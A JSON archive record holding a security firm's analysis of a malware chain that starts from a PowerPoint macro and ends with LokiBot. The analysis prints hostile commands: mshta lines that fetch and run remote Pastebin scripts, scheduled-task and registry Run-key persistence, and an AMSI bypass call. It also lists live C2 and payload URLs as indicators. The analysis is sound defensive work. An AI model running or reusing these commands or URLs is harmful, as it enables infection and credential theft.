{
    "id": "5ea6948f-dd66-4bcd-9bb1-1e4cca798b61",
    "created_at": "2023-01-12T15:04:27.885396Z",
    "updated_at": "2025-03-27T02:05:25.635155Z",
    "deleted_at": null,
    "sha1_hash": "282a849e49b7787b3f4bc7eedd2d69f25408df53",
    "title": "2020-08-26 - A twisted malware infection chain",
    "authors": "",
    "file_creation_date": "2022-05-28T03:48:00Z",
    "file_modification_date": "2022-05-28T03:48:00Z",
    "file_size": 726615,
    "plain_text": "# A twisted malware infection chain\n\n**lab52.io/blog/a-twisted-malware-infection-chain/**\n\nRecently, a malware dropper received by mail has caught our attention as we have detected\ndifferent samples sent to multiple targets in Spain, Portugal, Italy and Norway, although it has\nprobably reached many more European countries.\n\nFirstly, it is characteristic that it lands on the victim in PPT format, while it has been much\nmore common to find DOC or XLS extensions being used for this purpose.\n\nThe document has no content, but when you close the PPT viewer, the following window\nshows up:\n\nThis window is generated by the macros contained in the On_Close function, which is\nexecuted when you close the document, instead of when oppened, thus preventing macros\nfrom being executed in many sandbox solutions. This macro have the following slightly\nobfuscated code:\n\n\n-----\n\nNote that, before the MsgBox, it executes Shell with two concatenated variables. If we\nlook at the content of those two variables, we can see that they contain the following string:\n“mshta.exe https://j.]mp/kasasjdoopoopasdskdd”, which causes the legitimate Windows\ninterpreter “mshta” to execute a script hosted on the web that follows.\n\nIn fact, this address only redirects to the following link in Pastebin:\nhttps://pastebin.com/mqRZ7CBC, which contains the following obfuscated script:\n\nAfter cleaning up the script a bit, we can see that it triggers the execution of the following\ncommands:\n\n‘id1\n\nrun mshta.exe “https://pastebin.com\\raw\\ZnhyvWAU”\n\nrun schtasks.exe “C:\\Windows\\System32\\schtasks.exe” /create /sc MINUTE /mo 60 /tn\n“xesefiliym” /tr “mshta.exe “https://pastebin.com\\raw\\ZnhyvWAU” /F\n\n‘id2\n\nrun reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\trats2di =>\nmshta.exe “https://pastebin.com\\raw\\d7kxMSZd”\n\n‘id3\n\nrun reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\ => mshta.exe\n“https://pastebin.com\\raw\\VJDyrCD2”\n\n‘defid\n\nrun mshta.exe “https://pastebin.com\\raw\\9dva5i24”\n\nrun reg add HKCU\\\\Software\\\\Microsoft\\\\Windows notepad\\\\CurrentVersion\\\\Run\\\\rednefed\n=> mshta.exe “https://pastebin.com\\raw\\9dva5i24”\n\nBasically, the script consists of the execution of two other Pastebin mshta scripts, and the\ncreation of persistence of these two, plus another two extra in the registry and in the\nprogrammed tasks of the system, causing that in each reboot, there are 4 scripts being\ndownloaded from Pastebin and executed on the computer.\n\nThe execution of each of the 4 scripts is preceded by one of the following identifiers “id1,\n**id2, id3 and defid“.**\n\nSince the script executed by id1 is the most complex, we will leave it for the end of the post\nand we will focus first on the other 3 in order of complexity.\n\n\n-----\n\n**id3 does not run anything, probably the author who is using this dropper did not need it and**\nleft it free, pointing to the next script hosted in Pastebin:\n\n<script language=”&#86;&#66;&#83;&#99;&#114;&#105;&#112;&#116;”>\nself.close\n</script>\n\n**id2 consists of a small script in powershell, which runs on every reboot and stays in a loop**\nchecking everything copied to the Windows clipboard. In case that the copied string is a\nBitcoin address, it replaces it with the attacker’s Bitcoin address, in order to make the user\ndeposit money into the actor’s account:\n\nIn this case, although the script is capable of storing up to four bitcoin addresses, the script\nonly has one repeated four times (19kCcdbttTAX1mLU3Hk9S2BW5cKLFD1z1W), from\nwhich has been possible to identify different sources that did not have much activity:\n\n**Defid, on the other hand, points to another script, which downloads from Pastebin a base64**\nencoded file, which has been inverted and where the “0” characters have been replaced by\nthe “.” character in order to make its analysis more difficult:\n\n\n-----\n\nAfter sorting and decoding it, we obtain a small executable developed in .Net and without\nobfuscation whose only purpose is to drop in the system a .vbs file that disables a large\nnumber of system security policies, including those of Windows Defender and MS Office.\n\nFinally, the script executed by id1 after being cleaned up a bit, contains the following relevant\ncommands:\n\nThis script, first of all leaves some kind words for the analyst who is reviewing the execution\nflow of this threat, and informs us that he would like to change it’s job :). In terms of\ncapabilities, mainly what it does is download two other executables developed in .Net with\nobfuscation techniques similar to those of the “Defid” executable. Once downloaded and\ndeobfuscated, it loads them with “[System.Reflection.Assembly]::Load(XXX)” which allows\nhim to directly call functions within these binaries from PowerShell.\n\nThe call to the first binary loaded, is as follows\n\n$blind=[System.Reflection.Assembly]::Load($deblindB)\n\n[Amsi]::Bypass()\n\nThe name of the funcion and class being called gives clues of its purpose. The binary is\nobfuscated with ConfuserEx, therefore using some tool for the analysis, such as “de4dotcex”, can make easier to analyze its content.\n\n\n-----\n\nIt consists of a DLL that does what it promises, since it bypasses AMSI to avoid detection\nusing a version practically identical to this technique\n“https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell”.\n\nAfter this, it downloads a third executable from Pastebin, decodes it and stores it in a\nvariable that it calls $Cli2 and loads the second executable, also in .Net, and calls its function\n“Chris()” passing as parameters the string “notepad.exe” and the variable that contains the\nthird executable.\n\nThis second binary just loaded, after being analyzed in the same way as the AMSI Bypass\nDLL, is used to inject in a non .Net executable inside another process that is not .Net either.\n\nThat is, it creates a legitimate notepad process, and injects into it the third binary it has\ndownloaded.\n\nThis last binary, consists of a sample of the Bot/Stealer LokiBot, practically unpacked, which\nat this point, is in a system without most of its protection measures.\n\nIt is interesting that, up to this point, this campaign coincides in many points with the\nfollowing report related to an AgentTesla infection campaign, but as in this case, the final\nthreat is not developed in .Net, they have had to add this last extra loader, in order to inject\nmalware developed in other languages, in other processes.\n\nThe sample command and control server is\n“http://195.69.140.]147/.op/cr.php/Gi4uJRts3jTJM” and although its main function is to act as\na stealer, as it focuses on stealing credentials from all types of mail clients, FTP, browsers\nand many other services, it also acts as a bot, allowing some control over the computer by\nthe actor behind this threat.\n\nIOCs\n\nhttp://195.69.140.]147/.op/cr.php/Gi4uJRts3jTJM\n\nhttps://j.mp/kasasjdoopoopasdskdd\n\nhttps://pastebin.com/raw/ZnhyvWAU\n\nhttps://pastebin.com/raw/d7kxMSZd\n\nhttps://pastebin.com/raw/VJDyrCD2\n\nhttps://pastebin.com/raw/9dva5i24\n\nhttps://pastebin.com/raw/n9Zadz2P\n\nhttps://pastebin.com/raw/XCXpMvQC\n\n\n-----\n\nhttps://pastebin.com/raw/UTLkgL5Y\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-08-26 - A twisted malware infection chain.pdf"
    ],
    "report_names": [
        "2020-08-26 - A twisted malware infection chain.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535867,
    "ts_updated_at": 1743041125,
    "ts_creation_date": 1653709680,
    "ts_modification_date": 1653709680,
    "files": {
        "pdf": "https://archive.orkl.eu/282a849e49b7787b3f4bc7eedd2d69f25408df53.pdf",
        "text": "https://archive.orkl.eu/282a849e49b7787b3f4bc7eedd2d69f25408df53.txt",
        "img": "https://archive.orkl.eu/282a849e49b7787b3f4bc7eedd2d69f25408df53.jpg"
    }
}